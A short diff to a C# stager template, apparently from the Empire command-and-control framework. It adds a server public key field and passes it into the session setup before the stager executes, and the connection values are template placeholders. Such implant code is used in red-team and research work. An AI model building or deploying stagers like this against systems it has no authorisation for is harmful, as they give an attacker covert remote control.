@@ -30,10 +30,11 @@
               double jitter = {{ REPLACE_JITTER }};
               uint lostlimit = {{ REPLACE_LOSTLIMIT }};
               string agentlanguage = "dotnet";
-              string defaultResponse = "{{ REPLACE_DEFAULTRESPONSE}}";
+              string defaultResponse = "{{ REPLACE_DEFAULTRESPONSE }}";
               string[] arguments = { address, stagingkey, agentlanguage};
               byte[] skbytes = new byte[] { {{ agent_private_cert_key }} };
               byte[] pk = new byte[] { {{ agent_public_cert_key }} };
+              byte[] serverpk = new byte[] { {{ server_public_cert_key }} };
 
               SessionInfo sessionInfo = new SessionInfo(arguments);
               sessionInfo.SetWorkingHours(workinghours);
@@ -45,6 +46,7 @@
               sessionInfo.SetProfile(profile);
               sessionInfo.SetPrivateKeyBytes(skbytes);
               sessionInfo.SetPublicKeyBytes(pk);
+              sessionInfo.SetServerPublicKeyBytes(serverpk);
 
               (new EmpireStager(sessionInfo)).Execute();
             }
